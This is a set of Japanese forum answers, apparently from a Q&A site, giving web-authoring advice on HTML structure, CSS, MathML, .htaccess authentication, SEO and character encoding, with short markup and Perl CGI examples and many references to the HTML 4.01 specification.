javascriptではなく.htaccessなどを使います。javascripを無効にしている場合利きませんし。 　ただ、このgooやWiki、あるいは新聞社のサイト、多くのポータルサイトなどは、そのような方法は使いません。なぜなら、膨大な種類の端末用に膨大な同じ内容のページを作成しなければならないこと。新しい端末が登場するたびに作成しなければならないことなど現実的ではないからです。 　そもそもHTML自体が 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 　HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　あなたが作られたウェブページがHTMLで作成されていれば、基本的にはどの端末を利用してもちゃんと利用できるはずです。 　HTMLはそのためのものですから、だからあなたはそれを利用してウェブページを作成されてきたのでは？？？ 　基本的な手順は、 1) 率直にHTMLを作成します。 　PCはむろん携帯電話でも、点字端末でも、スクリーンリーダーでも、さらには検索エンジンでも内容が理解できるはずですね。 2) スタイルシートでそれぞれのメディアごとにスタイルシートを書きます。 3) スクリーンリーダーや印刷用が必要ならそれも書いておきます。 　それだけです。同じ内容を複数アップロードするとgoogleから蹴られる場合もあります。 　スマホのみのページがあれば、それはPC用の画面には表示されないようにすれば良いです。 ★スタイルシート 振り分け - Google 検索 ( https://www.google.co.jp/#hl=ja&safe=off&output= … )
＞適当にホイホイ色んなものをつぎ込んでしまいました。 　でしょうね。 　慌てず、まず ★はじめてのWebドキュメントづくり ( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) 　を最初から挑戦してみてください。古い資料ですが、HTML4.01の邦訳をされたメンバーの方ですので、厳密に書かれています。 　とにかく最初はデザインを考えずにマークアップする練習をしてください。当然HTML4.01strictで使用できるタグは限られていますから楽です。 →http://www.htmllint.net/html-lint/tagslist.cgi?H … 　このうち、数十個覚えて置きゃ良いです。 　当然、文書構造を示すには足りなくなりますから、divやspanとclass名を組み合わせて補完しないといけません。 　『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 そのときに参考になるのは ★HTML5の新しい要素名 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )です。 　新しい仕様のHTML5の登場を目前にして、HTMLの書き方は大きく変わります。--本当はもっと前から言われていた。No.1の回答のとおり 　それがきちんとできると、あとはスタイルシートでデザインしていきます。
仕様書をまず見る癖をつけましょう。 <!ELEMENT SELECT - - (OPTGROUP|OPTION)+ -- option selector --> <!ATTLIST SELECT %attrs; name size multiple disabled tabindex onfocus onblur onchange > ★http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … <!ELEMENT OPTION - O (#PCDATA) -- selectable choice --> <!ATTLIST OPTION %attrs; selected disabled label value > optionにもaccesskeyはありません。 [引用]acceskeyを持ちうる要素Related Elements A, AREA, BUTTON, INPUT, LABEL, LEGEND, TEXTAREA 属性索引( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ) 　
　再審査リクエスト ( http://support.google.com/webmasters/bin/answer. … )はされたようなので、待つしかないでしょう。消えた原因は多分推察されたことでしょう。 　私は面倒くさいので、そもそもdescriptionは記述していません。googleはこれを内容との比較にだけ使用していて、これをインデックスの作成には一切利用しないことを公言していますので。参考にはするけど・・・(逆の意味で) 　いずれにしても、googleの検索結果を気にしたページ作りは、結果的に順位を下げることになります。 『検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。』品質に関するガイドライン ( http://support.google.com/webmasters/bin/answer. … ) 　ですね。
あなたが作ったHTMLに <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> を入れたら文字化けしている、ということなのでしょうか? そのHTMLはUTF-8で書かれているのですか? 例えば、Shift_JISで書かれたHTMLに上の様に記述をすると、UTF-8で書かれていると判断するので、コードの不一致から文字化けします。 # この記述から保存する文字コードを決定したり、実際の文字コードに合せて記述を自動変更したりするエディタも一部にはあります。 # が、通常は、記述と実際のコードを一致させるのは、作者の責任です。 それとも、まったく別の現象なのでしょうか? それならば詳しく補足してください。
No.2の補足です。 ＞ブログでTEXを使って、記事を書きたいのですが、 　最も簡単なのは、Texのコードをそのまま書けばよいかと・・・ \dfrac {-b\pm \sqrt {b^{2}-4ac}} {2a} 　わかる人にはわかる。 　直接ソースが書けるなら <math xmlns="http://www.w3.org/1998/Math/MathML"> 　<mstyle displaystyle="true"> 　　<mfrac> 　　　<mrow> 　　　　<mo> - </mo> 　　　　<mi> b </mi> 　　　　<mo> &#x00B1;</mo> 　　　　<msqrt> 　　　　　<msup> 　　　　　　<mrow> 　　　　　　　<mi> b </mi> 　　　　　　</mrow> 　　　　　　<mrow> 　　　　　　　<mn> 2 </mn> 　　　　　　</mrow> 　　　　　</msup> 　　　　　<mo> - </mo> 　　　　　<mn> 4 </mn> 　　　　　<mi> a </mi> 　　　　　<mi> c </mi> 　　　　</msqrt> 　　　</mrow> 　　　<mrow> 　　　　<mn> 2 </mn> 　　　　<mi> a </mi> 　　　</mrow> 　　</mfrac> 　</mstyle> </math> と書けば良いです。ただしブラウザによる制限があります。 情報サイトを挙げておきます。 MathML 日本語情報 ( http://washitake.com/MathML/ )
該当部分のCSSのソースとHTMLのソースをいただけませんか？ また併せて、スペルミスがないかご確認ください。 たまにやってしまうミスとして、MARGINをMAGINと書く方がおられたりします。
それは変わるはずです。当たり前・・ そのファイルに、そのページを描画するのに必要な追加ファイル--画像/スタイルシート/javascriptなどがある場合、ブラウザは改めてサーバーにそのファイルを要求しますが、そこに <img src="./images と書かれていたら、今いるはずの場所の下を要求しますね。 ※webサイトの「index」を非表示にしたい - HTML - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7721306.html#a4 )に説明しています。 　よってすべての参照ファイルをその都度書き換えなければなりません。 　サブディレクトリに、下位ディレクトリを指定するととても厄介なことになります。PHP側でルートより上を参照するパスはhttp://で始まるパスに書き換えるようにすることなど--
　意味がよくわからないのですが、HTTP応答ヘッダに最終更新日があるので、もし変更があればキャッシャは書きかえれるはずです。 　改訂されていなければ、キャッシュの期間が指定されていない限り、ユーザーの保存指定期間内は保存されるはずです。 　すでに保存されているものに対して、更新されていないのに製作者側からそれをコントロールすることはできません--が、あたらしく読まれるページのキャッシュについては、有効期間を指定することで指定できます。 　接続するたびにファイル名をかえると言う方法もありますが、あまりしたくない方法ですね。
そもそも重複URLが悪いのではなく、SEO対策が適当ではないため、 Googleによって減点処置が施された可能性が高いです。 Google等の機械検索エンジンは、毎週のようにウェブサイトの定義を更新しており、 その定義に違反するページは減点され、表示順位が下がります。 つまり、SEO対策に何らかの不備があり、条件が変化したためと考えられるので、 SEO対策の見直しをすると良いです。 linkタグによるcononical属性の付与については、同一内容であれば良いのですが、 別内容のサイトにcononical属性の付与をすることはあまりお勧めできませんが、 別内容のサイトにcononical属性を指定すると、クロールの際にヒントとして 扱われる程度となります。 扱いとしてはかなり優先順位が低くなります。
圏外ってGoogleの検索結果に載らなくなったってことですかね。 だとするとヤバいですね。 ミラーコンテンツは確かにスパム行為にあたりますが、一般的なサイト（どんなサイトかわかりませんが・・・）でその程度では大丈夫な気がしますので、もっと重大なスパム行為があったのでは？ http://www.seo-matome.jp/spam/ 単にブログをやりはじめてJUGEMのランクで圏外になったという話でしたら心配ないと思います。 ブログなんて星の数ほどありますから、定期的にまともな話をアップしていけば徐々にランクがあがっていきますよ。 はじめはJUGEMの新着インデックスかなんかに登録されていてアクセス数があったのが、新着から外れて訪問者が減ったとかそんなところじゃないでしょうか。 的はずれだったらスイマセン。
　CSS3を使えばデザインを変えることは出来ますが、CSS3のborder-radiusは使えるブラウザが限られています。 　最も簡単なのは、 <button name="submit" value="送る" type="submit"> 送る<img src="./icons/button.gif" alt="ナイス"></button> など、button要素を使うほうが良いです。 17.5 BUTTON要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　ただし、ユーザーインターフェースに関わるこの様な要素やポインター、スクロールバーは手をつけないほうが良いです。そんなもの目的でユーザーが尋ねてくるわけじゃない。逆に追い出すことになりかねません。 　
勝手に画像が壊れることはないだろうから、uploadディレクトリ内の画像の有無、DBのパス間違いの有無、何のタイミングで画像が見えなくなるのか調べてみて、原因が何かを突き止めるのが先決かと。 想像ですが、画像が壊れてるのではなく、ランダム表示のPHPのソースか「Exec-PHP」てのが何をするプラグインかわかんないけど、そのせいでパスが狂っているのだと思われ。
此の手の問題は、 1.IEのアドオンの問題 2.GPUレンダリングの問題 3.プラグインの問題 等々が考えられる様です。 A. http://snow-white.cocolog-nifty.com/first/2011/0 … (冒頭、XIE6→〇IE9) B. http://support.microsoft.com/mats/ie_freezes_or_ … 初めに、A.を試行してみて下さい、此れで駄目ならB.を試行して下さい。普通は、A.orB.何方かで解決される様ですが、如何(どう)しても駄目な様なら、IE8へダウンさせて様子を見るのも手ですね(IE9をアンインスト～ルすると自動でIE8に戻ります、御存知でしょうが)。
私はGmail使ってないので詳しくは分かりませんが、 「Gmail 画像挿入」で検索するとGmailで本文中に画像挿入出来るようです。 http://kenz0.s201.xrea.com/weblog/2009/04/gmail_ … http://support.google.com/mail/bin/answer.py?hl= … 使用ブラウザが書かれてませんが、Google Chromeならドラッグ&ドロップに対応してるようです。
第2階層から.パスワードをかけるのなら、.htaccessの置き場所はそれで問題ありません。 ただ、.htpasspwを、アクセス可能なディレクトリに置くのはセキュリティ上好ましくありませんので、 public_htmlの外に置いたほうがいいですね。 その際に、.htaccess内の.htpasspwまでのパスを変更しましょう。 また、ベーシック認証ファイルを簡単に生成してくれるサイトがあるので、 こういう所を利用すると楽です。 http://www.htaccesseditor.com/#a_basic
すみません、既に回答がありました。 .htaccessの内容は、この質問に関連する内容を全て消してください。
Windows上のローカルサーバーなら、問題なく動作するはずですが？？ hhtp://locla.server/無題.html ネットワーク経由では無理だったと思います。 URIに使える文字は ( http://www.ietf.org/rfc/rfc2396.txt ) です。
gooでしたら リクエストを受けると、PATH_INFOを参照して該当するページを提供し、その提供時にcookieを調べて、なければログイン欄を隅っこに表示する。cookieがあれば、それで「ようこそだれそれさん」を追加する。 　httpd.confないし.htaccessでDirectry Indexをnatarakantara.[適当な拡張子とか]にてもしておいて、通常のパスで要求を受けたら同様の処理をする。この場合は使用している言語がわからないのでスマートかも・・Windowsと異なりファイル名や拡張子は個別に指定できますからお好きな言語で・・ 　http：//hoge.com/news/abc/20120928001.htmlを要求されたら、newsというプログラムを実行し、/abc/20120928001.htmlというPATH_INFOを元に、データベースから必要な記事を持ってきて、Content-type:text/html でHTMLを出力させればよい。あるいは、natarakantara.xyzを起動して/news/abc/20120928001.htmlを処理しても良い・・ 　すでにページがあるのでしたら.htaccessで AddType application/x-httpd-cgi .html 　とでもしておいて、すべてのHTMLファイルの前に #!/usr/locla/bin/perl $cookies = $ENV{'HTTP_COOKIE'}; @Cookies = split(/;/,$cookies); ・・・cookie処理・・・ while(<DATA>){ s/置換処理/; print; } __END__ この下に従来のHTMLをそのまま・・ 　でもよい・・・ 　要は、動的にHTMLを出力さえすればよいだけです。 　
無理です。たとえjavascriptでそのような処理を可能でもjavascriptを使わないブラウザなら利きません。 　checkboxの場合は必ずnameを変えて送信して、処理系で処理します。もし、同じnameを使うなら--使えませんが--、配列に格納すればよいだけです。この場合は、selectにmultiple属性を着けるほうが良いでしょう。 <select name="option" multiple><option value="a">A<option value="b">B<****
一番下の【説明】のところに書いてありますよ。 IE8だとタブ設定に関係なく新しいウィンドウで開かれる。 Firefoxならタブで開かれる。
テスト用 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> <meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> <title>Untitled</title> <meta name="author" content="IRUKA"> <meta http-equiv="Content-Style-Type" content="text/css"> <style type="text/css"> html,body{margin:0;padding:0;} h1,h2{margin:20px;background-color:fuchsia} div.header,div.section,div.footer{ border:inherit soli 1px; padding:30px; margin:10px; height:200px; } div.header{background-color:aqua;} div.section{background-color:yellow} div.footer{background-color:lime;} </style> </head> <body> <div class="header"> <h1>タイトル</h1> </div> <div class="section"> <h2>見だし</h2> </div> <div class="footer"> <h2>文書情報</h2> </div> </body> </html> 一行目の<doctype>宣言を取ってのけると、IEと標準ブラウザのデザインが変わります。付いていれば同じはず。
divided[di・vid・ed] ( http://dictionary.goo.ne.jp/leaf/ej3/24697/m0u/D … ) HTMLの勉強を始めたら、必ず ★HTML 4.01 Specification (ja) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　はブックマークしておきましょう。全部を通しで読んでおいたり、必要な情報を見つけ出したり・・。ネットや書籍と言う藁の中から針を探すより、よほど確実です。 7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　HTMLは、それを読み解き、その文書を構成する要素(Element)に分解し、それがどんな要素であるかをタグを使ってマークアップするものです。 　決してデザインのためではありません。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　それが段落でしたら<p></p>(Pargraph)で括りますし、見出しだったら<hn></hn>で括ります。引用が単語とかフレーズでしたら、行内要素の<q></q>で括りますし、ひとつの段落でしたら<blockquote></blockquote>で括ります。
補足拝見しました。 以下の4点に問題があります。 (1)最後に</p>（終了タグ）があるのに開始タグがありません<p> (2)<img>タグになぜか拡張子　.jpg　がふたつもあります。 (3)<strong>タグはテキストを強調する要素なので不要です。 (4)空タグ<span>を連続して使用しているのは意味がありません。 前<strong><span class="fsize_l"><span class="img"><a href="http://www.xxxxxXX.co.jp/guide/index.html"><img src="_src/sc745/XXXXXxxxxxXXXX.JPG" width="396" height="96" alt="XXX(xxxxxXX).JPG"/></a></span></span></strong><strong><span class="fsize_l"><span class="img"><img src="_src/sc744/sign.png" width="500" height="120" alt="" /></span></span></strong></p> 後<strong><span class="fsize_l"><span class="img"><a href="http://www.xxxxxXX.co.jp/qab/xxXX.jsp?agentcode= … src="_src/sc745/XXXXXxxxxxXXXX.JPG" width="396" height="96" alt="XXX(xxxxxXX).JPG"/></a></span></span></strong><strong><span class="fsize_l"><span class="img"><img src="_src/sc744/sign.png" width="500" height="120" alt="" /></span></span></strong></p>
No.2の回答は、参考にされたサイトを基にしていますから、もっと簡単な例を h1:hover:after{content:"▲;} h1:after{content:"△";} で、h1に△を追加しておき、h1にポインターが乗ると▲に変わります。 ・content ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) ・:before、:after疑似要素 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　詳細度を比較すると、h1:hover:afterは[0012]で、h1:afterは[0,0,0,2]ですから、前者が優先されますね。 ・Calculating a selector's specificity ( http://www.w3.org/TR/CSS2/cascade.html#specificity ) これを画像にする場合は content:url(); です。このcontentは、章番号を自動的に振ったりすることに利用することが多いですが、このように画像やテキストを加えることもできます。 　挿入される内容の位置は、positionと座標で指定します。 ・指定しなければ、そのまま:beforなら前に、:afterなら後 ・追加される内容相対配置する場合は、position:relativeで指定してずらします。 ・絶対配置する場合は、直近のstatic以外の親になる要素の座標を基準にします。 h1{position:relative;} h1:after{content:"▽";postion:absolute;top:-100%;left:0;} h1:hover:after{content:"▼";color:red;} ・配置体系 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) ※質問は画像と言う表題でしたが、画像はアニメーションGIFで良いです。 　それを表示するためにはスタイルシートを使用すると良いでしょう。HTMLには何も手を加えなくて良いですしね。
今ソースを見ると、 <p class="center">画像</p> と p.center { text-align:center; } に変わってますね。 センター寄せ自体は有効ですが、 p に指定してある　padding: 0 0 0 20px; が効いているのでいるので、 少し中央より右側に寄っているというのが現状です。 p.center { text-align:center; padding:0; } で直ると思います。 また、段落の使い方に関しては#1の方と同意見です。 改行は<br />を、段落が変わる場合に<p>を使いましょう。 また、句点などで区切られていない場合に<br />で改行するのはあまり好ましくありません。 （見ている人の環境((文字サイズやフォント))などによって、自動改行後すぐに改行したりする場合があります。）
Namazu はいかがでしょうか？ インストール後、対象になるドキュメントのインデックスを作成し、高速化を計ります。その後、全文検索が可能となります。
「現在サーバーを２つ持っているのですが、 片方（aとして）aのサーバーにホームページを開設していて リンクから、もう片方（bとして）bのサーバーにある資料を 参照してもらう時に、URLが”a”としたいのに”ｂ”となってしまいます。」 　ａサーバ上でフレームを使って、ｂサーバのurlを表示しないようにしては？　この方法で、私はcgiの在処をわからなくしています。
ウェブを利用していれば、常識以前の問題ですよ。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　何よりも大事にしなければならないのは、「主要ブラウザだけじゃない」と言うこと 　もちろん、ご存知でしょうが、いささか古くからある技術ですが、HTTPサーバーにもブラウザにも圧縮した状態で転送する方法はあります。apacheを利用されていればmod_filter.soとmod_deflate.soを動作するように設定しておけば良いでしょう。USER_AGENTが可能なら圧縮して送信する設定に出来ます。 　ですが、上記の理由でほとんど使われていません。 　そもそも、HTMLのテキストデータなんてタカが知れています。データ量の大部分を占めるのは画像や動画ですが、これらは元々圧縮されていますからgzipを使ったってデータ量は変わりません。逆にサーバーやブラウザの負荷ばかり上昇する。
保存時の文字コードを選択する方法は、どのようにしてファイルを編集されているかが問題です。 パソコンのOSとブラウザ名は書かれていますが、ホームページ作成ソフト名が書かれていません。 エディタで作成されている場合は、「文字コードを選択して保存」という項目がたいていついています。 新規保存時にも「文字コード」や「改行コード」の選択があるはずです。
HTML 4.x) HTML 4のSGML宣言でSHORT TAG YESであるため，省略タグ機構は使えますが，NET tagであっても， <div class="objects" //としかならないため，/>は書けません。 「HTML 4標準およびSGML標準のみに沿うならば」<div class="objects" /テスト/とかが許されますが，これを理解できるブラウザはまずないでしょう。 HTML 4.01の仕様書B.3.7にも，「unlikely to work with many existing HTML tools.」と書かれているものです。 http://www.w3.org/TR/html4/appendix/notes.html#h … XHTML 1.x) XMLの文法に従うため，有効です。 http://www.w3.org/TR/xml/#NT-EmptyElemTag ただし，XMLの仕様書には内容がEMPTYと定義されているときのみ使うことが推奨されています。 また，XHTML 1.0においても，HTML 4との互換性における要請として，EMPTYの時のみの利用が推奨されています (C.3はinformative)。 http://www.w3.org/TR/xhtml1/#C_3 HTML5 HTML記法) 空要素およびforeign elementに関しては，/>の閉じを許しますが，divには許されていません。 http://www.w3.org/TR/html5/syntax.html#elements-0 HTML5 XHTML記法) 仕様では定義されず，XMLに丸投げされています。 http://www.w3.org/TR/html5/the-xhtml-syntax.html … このため，先の，EMPTYなものだけ/>を使う，ということが推奨されます。
まず、それらのサイトのURLをご覧ください。PC用もスマートホン用もURLは同じはずです。 そもそも、 ＞スマートフォン用のホームページを作っています。 　が間違っているのです。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より ★仕様書のこの項目は必読です。前後も読んでおくこと 　そもそも、今後もますます色々な端末が登場しますが、その都度同じ内容のHTMLを作り続けるつもりですか？??考えただけでぞっとします。 　できれば一つのHTMLで、端末によって適用されるスタイルシートを変えるようにすればよいだけです。 →14.2.4 出力メディア型 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　以下が参考になるでしょう。他にもさまざまなサイトで紹介されています。 CSS3 Media Queries を使って、Webサイトをスマートフォンに対応させるときの注意書き ( http://webdesignrecipes.com/web-design-for-mobil … )
いずれも根本的に間違っています。sectionやdiv sectionは、それが目次の項目としてリストアップされるような文書集合に使用し、通常は見出し[ひとつだけ]を伴います。 ★4.4.2 The section element ( http://www.w3.org/TR/html5/the-section-element.h … ) 　<section>の中に複数の見出しは入りません。入れるときは<hgroup>を使用します。 　また、class名は独自のものを使わないように・・ <body> 　<header> 　　<h1>見出し</h2> 　</header> 　<section> 　　<h2>・・・</h2> 　　<section id="transportationList"> 　　　<h3>乗り物</h3> 　　　<section id="bicycle"> 　　　　<h4>自転車<h4> 　　　　<p>・・・</p> 　　　</section> 　　　<section id="automobile"> 　　　　<h4>自動車</h4> 　　　</section> 　　　<section id="train"> 　　　　<h4>電車</h4> 　　　</section> 　　</section> 　</section>　　　　　　 <foooter> </footer> ★HTML5では、見出しレベルはHに付く数字ではなく、sectionの階層レベルになります。 4.4.6 The h1, h2, h3, h4, h5, and h6 elements ( http://www.w3.org/TR/html5/the-h1-h2-h3-h4-h5-an … ) 　上記のように、階層にしたがってh1→h6を使用するか、すべてh1を使うことが推奨されています。すべてh1を使うほうがメンテナンスは楽になります。 ＞(divは、H3をインデントするために使用) は禁止です。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 注。 CSSではclass属性が非常に大きな力を持っている。 したがって文書作成者は、体裁に殆ど何の関係も無い要素（HTMLだとDIV要素やSPAN要素など）をベースにして、それらにclass属性でスタイル情報を与えれば、独自の構造化言語を設計できると考えられる。 しかし、文書の構造要素は広く受け入れられている一般的意味を持つ場合が多いので、こういった使用法は避けるべきである。 文書作成者が定めたクラス名では、意味を理解してもらえない場合もある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［セレクタ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … )］より ★HTML5は現状では使わないほうが良いです。未勧告ですからまだまだ変更があります。使う場合はHTML5を理解できない古いIEのためにjavascriptなどでの対応が必要です。 　HTML4を使って、 <body> 　<div class="header"> 　　<h1>見出し</h2> 　</div> 　<div class="section"> 　　<h2>・・・</h2> 　　<div class="section" id="transportationList"> 　　　<h3>乗り物</h3> のようにしておくほうが良いでしょう。<doctypeを変更すれば・・・そのままHTML5でもあるし。
　補足ですが、ウィンドウ巾は640pxあたりから上のサイズなら横スクロールなしで問題なく閲覧できるはずです。スマホや横幅1900pのディスプレイでも使える。横幅が1200を越えると中央に表示される。横に並ぶ数が変わります。 　古いIEはfixedに対応していないため、fixed.jsを拾ってきてください。 　印刷や他の端末を考慮するなら、mediaをscreenに限定してください。fixedでは各ページに印刷されます。 　HTMLには文書構造しか書かれていないので、スタイルシートだけを書き換えることで好きなデザインに変更できます。見出しだけ表示させておいて、マウスオーバーで画像や説明を表示させるとか、スライドショー形式にするとか、何でもできます。代替スタイルシートでユーザーに選択してもらっても良いでしょう。 　まあ、HTMLもスタイルシートも簡単で解りやすいのでここから先はご自身で挑戦してください。
＞HTMLを勉強しています。 　でしたら、書いたら ★Another HTML-lint 5 ( http://www.htmllint.net/en/html-lint/htmllint.ht … ) 　で、書くたびにチェックする癖をつけましょう。もちろん、解らないときは ★HTML 4.01 仕様書邦訳 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　は必ず目を通して、必要なときどこを読めばよいかくらいはわかるようにしておきましょう。 H1要素にはブロック要素は入りません。 　　→『<!ELEMENT (%heading;) - - (%inline;)* -- heading --> ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　　　(%inline)*は行内要素が0個以上しか入らないということ 　　→7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　ソースではなく、要素(はタグで括られている)に、角丸を付けたいということでしょうが、それはCSS3のborder-radiusプロパティを使います。 <div class="item-group">内のh3要素を角丸にしたいなら div.item-group{border:solid 1px gray;border-radius:10px;} とかです。４隅に対して個別に指定することも出来ます。
附記A: HTML 4.0におけるスタイルシートの例 ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　をご覧ください。 　改行とブロック要素の境界はしっかり区別をつけましょう。 ブロック要素では、『新しい行が開始される』です。 　→7.5.3 ブロックレベル要素と行内要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
フリーの画像編集ソフトを馬鹿にしてはいけません。 　GIMP,Paint.NET,inkscape,ImageMagick(コマンドラインで使用)など、有償ソフトと同等、または、それ以上の機能を持つ画像ソフトはたくさんあります。 　私も、デザインのセンスには自信がないのですが、良いサイトがあれば、それをまねることから始めましたが、はっきり言ってツールではなくて、センスと経験と能力ですね。こればっかりは大枚をはたいても手に入りません。
http://good.vg/のスライドショーは#1さんも取り上げてますが、 jQueryプラグイン（jquery.js、s3Slider.js）が使われてます。 s3Slider.jsを使ったスライドショーの設置例説明サイトもたくさんあります。 例えば http://motoshige.net/archives/842 とか。 上の設置例にはjquery-1.6.2.min.jsとs3Slider.jsが使われてます。 （jquery-1.6.2.min.jsとs3Slider.jsは上記URLからダウンロード出来ます） 黒でフェードイン・フェードアウトさせるには背景色を黒にします。 画像ディレクトリ（「sozai」）は便宜指定すれば良いです。
本ではありませんが、こちらのサイトが自分としてはオススメです。 http://park16.wakwak.com/~html-css/index.html
>これって「子要素と孫要素」だけではなく、 >「下の階層にある要素全て」が正しいと思っています。 >（要は、ひ孫要素以下にもスタイルシートが適用されますよね？ってことです） 正しいです。 子要素のみでしたら E>F となりますし、子+孫でしたら E>F,E>*>F となります。 >それとも、「子孫要素」って下の階層全部のことを意味しているんでしょうか？ >それはそれで、漢字の意味に疑問を持ちますが・・・ しそん要素なので、下の階層ぜーんぶを意味します。 漢字の意味？まさか、こまご要素と読んでます？？？？ 私にはちょっと、新鮮な読みです。
<form nameはありません。付けてもよいけど送信はされません。 <form action="[送信先1]"> 　<imput type="submit"*** </form> 　が[送信先1]に送られますが、[送信先2]には送られません。他のすべてのHTMLのタグと同様、あくまで<form></form>でひとつの要素です。終了タグを省略できるものもありますが・・ 　17 フォーム ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
A要素のhref要素の値は、URI以外記述できませんから、それがきちんとしたURIであれば、どのブラウザも対応していなければなりません。 ★Links in HTML documents (ja) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★Basic HTML data types (ja) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★Performance, Implementation, and Design Notes (ja) ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
<select name="AAA">の選択メニューだとすると、[name]=[value]、すなわちAAA=aaa/aaa..asp?nurl=../bbb/bbb.aspというセットが、<form action="">で示されたプログラムに送信することになります。 　値自体は、本当に何でも構いません。これは一見、特定のURLの一部のように見えますが、それがなにを意味するかは、一切わかりません。わかるすべもありません。 　それとは、まったく別件で、URLは http: プロトコル(手続き)名 // 　　インターネット hoge.com　HTTPプロトコルを扱うサーバーのドメイン /path/path/path　PATH_INFO です。実際のファイル名であったり、そうでなかったり ?****　　?以降は、QUERY_STRINGという値で、サーバーで何かに使われるのかもしれません。
便乗しまして、 無料でサポートのあるFC2とか http://web.fc2.com/ 無料で広告が入らないほうが良いのなら デジデジとか http://www.digidigi.jp/ そういうサイトはダメですか？
No.3です。少しだけ補足しておきます。 CSS2から採用された全称セレクタ(詳細度0)で、すべての要素のスタイル指定をリセットできますが、 　仕様書に 『しかし一般的に言って、著者はHTML要素の慣習的解釈を上書きするようなことはしないよう求められる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　とあるように、リセットは最低限必要なもののみにとどめるべきです。リセットしてしまうと、すべての要素に対してスタイルシートで再設定しなければならなくなり、スタイルシートが肥大化してしまいます。 　*{margin:0;padding:0;}なんてのは、オーサリングツールで使われ始めた手法でしょう。 　私は html,body{margin:0;padding:0;} だけしか行いません。その場その場で必要に応じて設定しましょう。
<input type="button" name="test" value=&quot;あああああああああああああああああああ" style="padding-left:0;padding-right:10em" />
スタイルシートで次の1行を入れてください。 img { vertical-align: bottom; }
ホームページはあるのですか？ないのですか？どちらとも取れる質問なので。 ファイルをアップロードしたら、そのファイルへリンクを貼ってください。 PDF ファイルの場合は、クリックしたら表示されてしまいますが、右クリックから保存できます。 また、ZIP 形式などの圧縮ファイルにすると、クリックするだけでダウンロードになりますが、解凍（展開）の作業が必要となります。 無料ホームページはファイルの倉庫として認められないものが多いので紹介できません。
